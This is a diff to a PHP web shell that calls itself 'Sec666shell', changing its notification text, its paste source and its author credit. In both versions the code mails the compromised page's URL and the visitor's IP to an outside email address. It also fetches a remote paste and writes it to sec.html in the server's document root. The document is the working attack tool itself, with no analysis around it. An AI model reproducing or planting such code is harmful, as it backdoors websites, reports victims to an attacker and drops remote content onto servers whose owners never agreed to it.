@@ -3,10 +3,10 @@ ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
 $boss = 'zsec@gmx.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$ip = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($boss, "Hacker Was Here ", $ip, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+$ip = "akses : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
+mail($boss, "Sec666shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
 $check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
-$text3 = file_get_contents('https://ghostbin.co/paste/oswh6/raw');
+$text3 = file_get_contents('https://ghostbin.co/paste/shjro/raw');
 $op3=fopen($check3, 'w');
 fwrite($op3,$text3);
 fclose($op3);
@@ -229,7 +229,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br><font color="white" size="3px">zsec@gmx.com</center></font>
+echo '<center><br><font color="white" size="3px">{ zsec@gmx.com | GengefulGhost }</center></font>
 </body>
 </html>';
 function perms($file){
